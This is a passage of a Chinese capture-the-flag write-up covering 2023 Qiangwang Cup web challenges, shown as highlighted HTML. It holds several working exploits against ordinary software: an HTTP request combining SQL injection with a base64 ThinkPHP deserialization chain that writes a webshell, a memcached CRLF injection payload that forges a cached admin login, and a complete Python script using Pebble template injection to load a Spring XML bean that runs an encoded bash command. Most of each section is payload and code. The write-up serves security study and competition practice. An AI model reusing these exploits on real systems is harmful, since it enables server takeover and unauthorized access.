<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com/public/index.php/index/admin/goods_edit/id/1.html</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=9kfk3dm38nq1p2tbm00p6toad7</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

id=1&amp;name`%3d"",`data`%3d"YToyOntpOjA7aToxO2k6MTtPOjEzOiJ0aGlua1xQcm9jZXNzIjozOntzOjI3OiIAdGhpbmtcUHJvY2VzcwBwcm9jZXNzUGlwZXMiO086Mjg6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEhhc01hbnkiOjU6e3M6ODoiACoAcXVlcnkiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo1OiJ3aGVyZSI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086Mjk6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI4OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGVkIjozOntzOjY6IgAqAHRhZyI7YjoxO3M6MTA6IgAqAG9wdGlvbnMiO2E6Mjp7czo2OiJleHBpcmUiO2k6MDtzOjY6InByZWZpeCI7czowOiIiO31zOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czo2OiIAKgB0YWciO2I6MDtzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjM2MDA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7czo0OiJwYXRoIjtzOjU4OiJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvIjt9fX19fXM6OToiACoAcGFyZW50IjtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6MTp7czoxOiJhIjtzOjE6IjEiO31zOjExOiIAKgBsb2NhbEtleSI7czoxOiJhIjtzOjg6IgAqAHBpdm90IjtOO3M6MTM6IgAqAGZvcmVpZ25LZXkiO3M6MzU6IkFBQVBEOXdhSEFnWlhaaGJDZ2tYMGRGVkZ0aFhTazdQejRLIjt9czoyMToiAHRoaW5rXFByb2Nlc3MAc3RhdHVzIjtpOjM7czozMzoiAHRoaW5rXFByb2Nlc3MAcHJvY2Vzc0luZm9ybWF0aW9uIjthOjE6e3M6NzoicnVubmluZyI7YjoxO319fQ%3D%3D"where`id`%3d1%23=1111&amp;price=&amp;on_sale_time=&amp;image=11111&amp;data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A
</code></pre></div></div>
<p>然后访问编辑页面即可触发写入 webshell。</p>

<h2 id="thinkshopping">thinkshopping</h2>
<p>比赛时没有写出，参考其他 writeup 进行复盘：</p>
<ul>
  <li><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1702950024&amp;ver=4965&amp;signature=rXSWR*9miRpbF-9myXm8A6FnpOaDzclgYRus5rrfhSVt3OOHMhH76*ppZ8Ix9s*MdhFfxNDEi8x4PAnfqQ8HHP09V*7Y8HtgZCmq7RSw8ofAA5oGcILr2wQSXwUlNL10&amp;new=1">[CTF复现计划]2023强网杯初赛 thinkshop[ping]</a></li>
  <li><a href="https://boogipop.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/#easyphp">第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn’t Laugh</a></li>
</ul>

<p>thinkshopping 的环境与 thinkshop 有所不同：</p>
<ol>
  <li>移除了 good_edit.html 中反序列化的操作。</li>
  <li>移除了数据库中的 admin 用户，这导致正常情况下无法登陆。</li>
  <li>数据库中将 secure-file-priv 置空（thinkshop 中为非 web 目录），因此可以通过 load_file 读取 flag 文件，sql 注入漏洞依然存在，所以只需要登陆后台即可读取 flag。</li>
</ol>

<p>注意到登陆处配置了 cache，登陆时会尝试从缓存中获取数据。</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// 尝试从缓存中获取数据</span>
    <span class="nv">$adminData</span> <span class="o">=</span> <span class="nc">Db</span><span class="o">::</span><span class="nf">table</span><span class="p">(</span><span class="s1">'admin'</span><span class="p">)</span>
        <span class="o">-&gt;</span><span class="nf">cache</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nv">$Expire</span><span class="p">)</span>
        <span class="o">-&gt;</span><span class="nf">find</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span>
</code></pre></div></div>
<p>并且 thinkphp 里配置了 cache 方式为 Memcached，查看 phpinfo 可以判断 memcached 版本为 2.2.0.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="s1">'cache'</span> <span class="o">=&gt;</span> <span class="p">[</span>
        <span class="c1">// 驱动方式</span>
        <span class="s1">'type'</span>   <span class="o">=&gt;</span> <span class="s1">'Memcached'</span><span class="p">,</span>
        <span class="c1">// 缓存保存目录</span>
        <span class="s1">'path'</span>   <span class="o">=&gt;</span> <span class="no">CACHE_PATH</span><span class="p">,</span>
        <span class="c1">// 缓存前缀</span>
        <span class="s1">'prefix'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="c1">// 缓存有效期 0表示永久缓存</span>
        <span class="s1">'expire'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
    <span class="p">],</span>
</code></pre></div></div>
<p>参考:<a href="https://www.freebuf.com/vuls/328384.html">php-memcached CRLF绕过 - FreeBuf网络安全行业门户</a> memcached 2.2.0 以下存在 CRLF 漏洞。</p>

<p>poc 如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1/test.php?token<span class="o">=</span>TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf

<span class="c"># 等价于</span>
<span class="nb">set </span>snowwolf 0 500 4
wolf
</code></pre></div></div>
<p>memcached 的 set 语法如下:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>key flags exptime bytes <span class="o">[</span>noreply] 
value 
</code></pre></div></div>
<ol>
  <li>key：用于从Memcached中存储和检索数据的键。</li>
  <li>flags：服务器与用户提供的数据一起存储的 32 位无符号整数，并在检索项目时与数据一起返回。</li>
  <li>exptime：以秒为单位的过期时间。0表示没有延迟。如果 exptime 大于30天，Memcached将其用作UNIX时间戳以进行过期。</li>
  <li>bytes：需要存储的数据块中的字节数。这是存储在 Memcached 中的数据的长度。</li>
  <li>noreply：这是一个可选参数。它用于通知服务器不发送任何回复。</li>
  <li>value：需要存储的数据。在执行带有上述选项的命令后，需要在新行上传递数据。</li>
</ol>

<p>thinkphp 中的 find 函数可以在 thinkphp/library/think/db/Query.php 中找到，如果开启了 cache。查询数据时会获取 <code class="language-plaintext highlighter-rouge">think:shop.admin|username</code> 的值。</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'fetch_sql'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="c1">// 判断查询缓存</span>
            <span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="kc">true</span> <span class="o">===</span> <span class="nv">$cache</span><span class="p">[</span><span class="s1">'key'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'think:'</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">connection</span><span class="o">-&gt;</span><span class="nf">getConfig</span><span class="p">(</span><span class="s1">'database'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'.'</span> <span class="mf">.</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'table'</span><span class="p">])</span> <span class="o">?</span> <span class="nb">key</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'table'</span><span class="p">])</span> <span class="o">:</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">'table'</span><span class="p">])</span> <span class="mf">.</span> <span class="s1">'|'</span> <span class="mf">.</span> <span class="nv">$data</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$cache</span><span class="p">[</span><span class="s1">'key'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$cache</span><span class="p">[</span><span class="s1">'key'</span><span class="p">];</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">connection</span><span class="o">-&gt;</span><span class="nf">getConfig</span><span class="p">(</span><span class="s1">'database'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'.'</span> <span class="mf">.</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$options</span><span class="p">)</span> <span class="mf">.</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">bind</span><span class="p">));</span>
            <span class="p">}</span>
            <span class="nv">$result</span> <span class="o">=</span> <span class="nc">Cache</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</code></pre></div></div>
<p>这个值在 memcached 中的格式可以通过下面的测试代码来获取：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">test</span><span class="p">(){</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nc">Db</span><span class="o">::</span><span class="nf">query</span><span class="p">(</span><span class="s2">"select * from admin where id=1"</span><span class="p">);</span>
    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"think:shop.admin|admin"</span><span class="p">;</span>
    <span class="nc">Cache</span><span class="o">::</span><span class="nf">set</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$result</span><span class="p">,</span> <span class="mi">3600</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>运行后可以得到正常的格式：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">"id"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"username"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"admin"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"password"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="s2">"21232f297a57a5a743894a0e4a801fc3"</span><span class="p">;}}</span>
</code></pre></div></div>
<p>还有一个需要注意的地方是，memcached 在写入数据时，flag 字段是留给用户自定义的，thinkphp 在写入不同类型的数据时，会设定不同的 flag 值，如 0 表示字符串，4 表示数组，数据库获取到的数据存储到 Memcached 时，使用的 flag 值就是 4。</p>

<p>所以利用 CRLF 写入时，也需要将 flag 值设定为 4，payload 如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>think:shop.admin|admin 4 500 101
a:3:<span class="o">{</span>s:2:<span class="s2">"id"</span><span class="p">;</span>i:1<span class="p">;</span>s:8:<span class="s2">"username"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>s:8:<span class="s2">"password"</span><span class="p">;</span>s:32:<span class="s2">"21232f297a57a5a743894a0e4a801fc3"</span><span class="p">;</span><span class="o">}</span>
</code></pre></div></div>
<p>exp:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mi">0</span><span class="nc">D</span><span class="o">%</span><span class="mi">0</span><span class="nc">Aset</span><span class="o">%</span><span class="mi">20</span><span class="n">think</span><span class="o">%</span><span class="mi">3</span><span class="nc">Ashop</span><span class="mf">.</span><span class="n">admin</span><span class="o">%</span><span class="mi">7</span><span class="nc">Cadmin</span><span class="o">%</span><span class="mi">204</span><span class="o">%</span><span class="mi">20500</span><span class="o">%</span><span class="mi">20101</span><span class="o">%</span><span class="mi">0</span><span class="nc">D</span><span class="o">%</span><span class="mi">0</span><span class="nc">Aa</span><span class="o">%</span><span class="mi">3</span><span class="no">A3</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">7</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A2</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bi</span><span class="o">%</span><span class="mi">3</span><span class="no">A1</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A8</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">username</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A5</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">admin</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A8</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">password</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A32</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">2221232</span><span class="n">f297a57a5a743894a0e4a801fc3</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">B</span><span class="o">%</span><span class="mi">7</span><span class="nc">D</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="n">admin</span>
</code></pre></div></div>

<h2 id="hellospring">hellospring</h2>
<p>题目提供了一个使用 pebble 作为渲染引擎的 Spring 服务，pebble 3.1.5 存在模板注入漏洞，参考：- <a href="https://zhuanlan.zhihu.com/p/551576769/">Spring 场景下突破 pebble 模板注入限制 - 知乎</a></p>

<p>文章提供的 payload 可以在本地打通，但目标测试时不会远程加载 xml，猜测不出网，所以可以先将 xml 文件内容写入本地，然后利用 file 协议从本地读取 xml。</p>

<p>另外，测试时发现 xml 是可以写入 /tmp 并且访问到的，但模板却怎么也写不进去。猜测服务端做了某种过滤，一步一步打印出来看是否能够正常加载。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{%</span> <span class="n">set</span> <span class="n">y</span><span class="o">=</span> <span class="n">beans</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory"</span><span class="o">).</span><span class="na">resourceLoader</span><span class="o">.</span><span class="na">classLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"java.beans.Beans"</span><span class="o">)</span> <span class="o">%}</span>
<span class="o">{%</span> <span class="n">set</span> <span class="n">yy</span> <span class="o">=</span>  <span class="n">beans</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"jacksonObjectMapper"</span><span class="o">).</span><span class="na">readValue</span><span class="o">(</span><span class="s">"{}"</span><span class="o">,</span> <span class="n">y</span><span class="o">)</span> <span class="o">%}</span>
<span class="o">{{</span> <span class="n">yy</span> <span class="o">}}</span>
</code></pre></div></div>

<p>当添加了下面这一句就无法正常写入了，猜测是对 org.springframework.context.support.ClassPathXmlApplicationContext 进行了过滤。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{%</span> <span class="n">set</span> <span class="n">yyy</span> <span class="o">=</span> <span class="n">yy</span><span class="o">.</span><span class="na">instantiate</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="s">"org.springframework.context.support.ClassPathXmlApplicationContext"</span><span class="o">)</span> <span class="o">%}</span>
</code></pre></div></div>

<p>最后发现仅仅是做了一个字符过滤，换为拼接即可绕过：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">"</span><span class="s">org.springframework.context</span><span class="sh">"</span><span class="o">+</span><span class="sh">"</span><span class="s">.support.ClassPathXmlApplicationContext</span><span class="sh">"</span>
</code></pre></div></div>

<p>exp 如下：</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="n">host</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://eci-2zeiuc2hk7njlsvn9mue.cloudeci1.ichunqiu.com:8088</span><span class="sh">"</span>
<span class="c1"># host = "http://127.0.0.1:8088"
</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/uploadFile</span><span class="sh">"</span>

<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">https</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">calc_time</span><span class="p">(</span><span class="n">date_string</span><span class="p">):</span>
    <span class="n">date_object</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">strptime</span><span class="p">(</span><span class="n">date_string</span><span class="p">,</span> <span class="sh">'</span><span class="s">%a, %d %b %Y %H:%M:%S %Z</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">t</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">date_object</span><span class="p">.</span><span class="nf">strftime</span><span class="p">(</span><span class="sh">'</span><span class="s">%H%M%S</span><span class="sh">'</span><span class="p">))</span>
    <span class="c1"># t -= 50000
</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] t: </span><span class="si">{</span><span class="n">t</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">t</span>

<span class="k">def</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">t</span><span class="p">,</span><span class="n">exp</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">-=</span> <span class="mi">4</span>
    <span class="k">if</span> <span class="n">exp</span><span class="p">:</span>
        <span class="n">loop</span> <span class="o">=</span> <span class="mi">16</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">loop</span> <span class="o">=</span> <span class="mi">100</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">loop</span><span class="p">):</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">file_20231217_</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>
        <span class="n">trigger_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/?x=</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">trigger_url</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
        <span class="k">if</span> <span class="sh">"</span><span class="s">constructor-arg</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] find exp in /tmp/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="s">file:///tmp/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">t</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">continue</span>
        

<span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
    <span class="n">exp1</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span> <span class="sh">'''</span><span class="s">&lt;?xml version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s"> encoding=</span><span class="sh">"</span><span class="s">UTF-8</span><span class="sh">"</span><span class="s"> ?&gt;
    &lt;beans xmlns=</span><span class="sh">"</span><span class="s">http://www.springframework.org/schema/beans</span><span class="sh">"</span><span class="s">
       xmlns:xsi=</span><span class="sh">"</span><span class="s">http://www.w3.org/2001/XMLSchema-instance</span><span class="sh">"</span><span class="s">
       xsi:schemaLocation=</span><span class="sh">"</span><span class="s">
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><span class="sh">"</span><span class="s">&gt;
        &lt;bean id=</span><span class="sh">"</span><span class="s">pb</span><span class="sh">"</span><span class="s"> class=</span><span class="sh">"</span><span class="s">java.lang.ProcessBuilder</span><span class="sh">"</span><span class="s"> init-method=</span><span class="sh">"</span><span class="s">start</span><span class="sh">"</span><span class="s">&gt;
            &lt;constructor-arg &gt;
            &lt;list&gt;
                &lt;value&gt;bash&lt;/value&gt;
                &lt;value&gt;-c&lt;/value&gt;
                &lt;value&gt;{echo,Y2F0IC9mbGFnID4gL3RtcC8xMjMxMjQucGViYmxl}|{base64,-d}|{bash,-i}&lt;/value&gt;
            &lt;/list&gt;
            &lt;/constructor-arg&gt;
        &lt;/bean&gt;
    &lt;/beans&gt;
</span><span class="sh">'''</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">exp1</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>

    <span class="n">date_string</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Date</span><span class="sh">'</span><span class="p">]</span>
    <span class="k">return</span> <span class="nf">calc_time</span><span class="p">(</span><span class="n">date_string</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">exp_path</span><span class="p">):</span>
    <span class="n">exp2</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span><span class="sh">'''</span><span class="s">{% set y= beans.get(</span><span class="sh">"</span><span class="s">org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory</span><span class="sh">"</span><span class="s">).resourceLoader.classLoader.loadClass(</span><span class="sh">"</span><span class="s">java.beans.Beans</span><span class="sh">"</span><span class="s">) %}
{% set yy =  beans.get(</span><span class="sh">"</span><span class="s">jacksonObjectMapper</span><span class="sh">"</span><span class="s">).readValue(</span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s">, y) %}
{% set yyy = yy.instantiate(null,</span><span class="sh">"</span><span class="s">org.springframework.context</span><span class="sh">"</span><span class="s">+</span><span class="sh">"</span><span class="s">.support.ClassPathXmlApplicationContext</span><span class="sh">"</span><span class="s">) %}
{{ yyy.setConfigLocation(</span><span class="sh">"'''</span> <span class="o">+</span> <span class="n">exp_path</span> <span class="o">+</span> <span class="sh">'''</span><span class="s">.pebble</span><span class="sh">"</span><span class="s">) }}
{{ yyy.refresh() }}</span><span class="sh">'''</span>
        <span class="c1"># "content":"111111"
</span>    <span class="p">}</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">exp2</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="n">date_string</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Date</span><span class="sh">'</span><span class="p">]</span>

    <span class="k">return</span> <span class="nf">calc_time</span><span class="p">(</span><span class="n">date_string</span><span class="p">)</span>


<span class="n">t</span> <span class="o">=</span> <span class="nf">upload</span><span class="p">()</span>
<span class="n">file_path</span> <span class="o">=</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">t</span> <span class="o">=</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
<span class="nf">trigger</span><span class="p">(</span><span class="n">t</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<ol>
  <li>exp 中的爆破时间其实没有必要，写入的速度其实比较快。</li>
  <li>我本地的时区不同，因此加上了 <code class="language-plaintext highlighter-rouge">t -= 50000</code> 这一句。</li>
</ol>

<h2 id="easyphp">easyphp</h2>
<p>一个以 xcache 为背景的逆向题：
